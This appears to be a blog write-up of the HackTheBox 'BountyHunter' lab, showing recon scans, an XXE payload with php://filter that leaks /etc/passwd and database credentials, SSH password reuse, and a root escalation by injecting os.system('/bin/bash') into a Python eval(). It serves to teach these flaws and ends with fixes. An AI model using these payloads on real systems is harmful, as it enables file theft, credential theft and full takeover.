---
toc: true
comments: true
title: HackTheBox - BountyHunter
layout: post
title: HackTheBox - BountyHunter
date: 2024-06-20 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Linux, XXE, XML, Web, PHP, Sudo, Python, PrivEsc]    
image: /assets/Posts/BountyHunter/logo.png
---

## Pre
- BountyHunter is the box I always recommend to someone who wants to *finally* understand **XXE** (XML External Entity injection). The web form is small enough to read end-to-end, so the vulnerability isn't magic – you can see exactly why it works.
- The privesc is equally instructive: a root-run Python script that `eval()`s attacker-influenced data. Two flavours of "never trust input", back to back.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

```shell
$ nmap -Pn -n -p 22,80 -T4 -sSCV -A -oN nmap/versions $IP
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
```

A PHP site. Fuzzing reveals a `portal.php` that links to a "bounty report" system (`log_submit.php`). There's also a `db.php` we can't read yet – note it for later.

## Phase 2: Understanding the form
The report form submits a bounty via JavaScript. If we intercept the request in Burp we see it isn't sending JSON – it's sending **base64-encoded XML** in a `data` parameter to `tracker_diff.php`:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>test</reward>
</bugreport>
```

The response echoes our field values back into the page. **User-controlled XML being parsed and reflected** is the textbook precondition for XXE. If the parser resolves external entities, we can define an entity that points at a local file and have its contents rendered back to us.

## Phase 3: XXE file read
We craft a payload that declares a `DOCTYPE` with an external entity. To read PHP source (which would otherwise be *executed*, not shown), we wrap it in a `php://filter` base64 converter so we get the raw source instead of its output:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE bugreport [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<bugreport>
<title>&xxe;</title>
<cwe>x</cwe><cvss>x</cvss><reward>x</reward>
</bugreport>
```

We base64-encode this whole blob, drop it in the `data` parameter, and the response now contains `/etc/passwd` – confirming XXE and revealing a user named **`development`**:

```shell
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000::/home/development:/bin/bash
```

Now the real prize. We swap the resource to the `db.php` config we spotted earlier:

```
php://filter/convert.base64-encode/resource=db.php
```

Decoding the returned base64 gives us database credentials:

```php
$dbserver = "localhost";
$dbname   = "bounty";
$dbuser   = "admin";
$dbpass   = "m19RoAU0hP41A1sTsq6K";
```

> XXE reading source via `php://filter` is a must-know trick. Requesting a `.php` file directly through a normal HTTP request runs it; the base64 filter hands you the source code instead, config secrets and all.
{: .prompt-tip }

## Phase 4: Credential reuse → foothold
Same lesson as OpenAdmin – try the password against the local user. It's reused for `development` over SSH:

```shell
$ ssh development@10.10.11.100
development@bountyhunter:~$ cat user.txt
```

## Phase 5: Privilege Escalation via sudo + eval
```shell
development@bountyhunter:~$ sudo -l
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

We can run a specific Python script as root. Reading `ticketValidator.py`, it loads a `.md` "ticket" file, runs a few validation checks on its lines, and – if they pass – executes the last line with **`eval()`**:

```python
if x[0] == '**' and x[-1] == '**':
    ticketCode = x[2:-2]
    if int(ticketCode) % 7 == 4:
        validationNumber = eval(x[2:-2])
```

So we don't attack the script – we craft a *ticket* that passes its checks and smuggles code into that `eval()`. The validation wants a line starting with `# Skytrain Inc`, a second line `## Ticket to ...`, and a code line beginning/ending with `**` whose numeric prefix is `≡ 4 (mod 7)`. We satisfy all of that and append a Python command injection after the number:

```
# Skytrain Inc
## Ticket to root
__Ticket Code:__
**102+__import__('os').system('/bin/bash')
```

`102 % 7 == 4`, so validation passes and `eval()` runs our `os.system` call as root:

```shell
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file. /tmp/root.md
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusions
- BountyHunter is two lessons in unsafe input handling: an XML parser that resolves external entities (XXE), and a Python script that `eval()`s partly-attacker-controlled data.
- The `php://filter` base64 trick to leak PHP *source* (and its embedded DB creds) is one of the highest-value techniques you'll carry into real web assessments.
- Fixes are simple in principle: disable external entities in the XML parser (`libxml_disable_entity_loader(true)`), and never `eval()` untrusted data – parse the number with `int()` instead.
- Next we tackle SQL injection and a `systemctl` SUID escalation on [Jarvis](/posts/hackthebox-jarvis/).

_Keep hacking_  🙈🙉🙊
